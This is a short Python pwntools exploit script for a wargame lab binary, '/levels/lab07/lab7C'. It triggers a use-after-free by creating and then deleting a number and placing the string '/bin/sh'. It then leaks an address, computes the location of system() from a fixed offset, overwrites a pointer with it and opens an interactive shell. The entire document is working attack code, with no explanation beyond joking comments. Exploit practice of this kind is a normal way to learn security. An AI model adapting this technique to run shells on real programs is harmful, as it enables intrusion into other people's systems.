import pwn

p = pwn.process('/levels/lab07/lab7C')
#libc_addr = pwn.ELF('libc.so')
#system_off = libc.symbols['system']

# gotta keep receiving the "Enter Choice:" line
p.recv(500)
# make a number
p.sendline('2')
p.sendline('6969')
p.recv(500)

# delete a number
p.sendline('4')
p.recv(500)
# make a string
p.sendline('1')
p.sendline('/bin/sh') # nothing to see here, just an innocuous string
p.recv(500)

p.sendline('6') # print a number, we totally didn't delete it earlier..
p.sendline('1') # index of number to print


rv = p.recv(500)
str_addr = int(rv[rv.index("enough: ")+8:rv.index("\n")], 10)
print('String address: ' + hex(str_addr))
#print('System offset: ', system_off)
system_addr = str_addr - 0x19f8b7
print('System Address: ', hex(system_addr))

p.sendline('3')
p.recv(500)

p.sendline('2')
p.sendline(str(system_addr))
p.recv(500)

p.sendline('5')
p.sendline('1')
p.recv(100)

p.interactive()
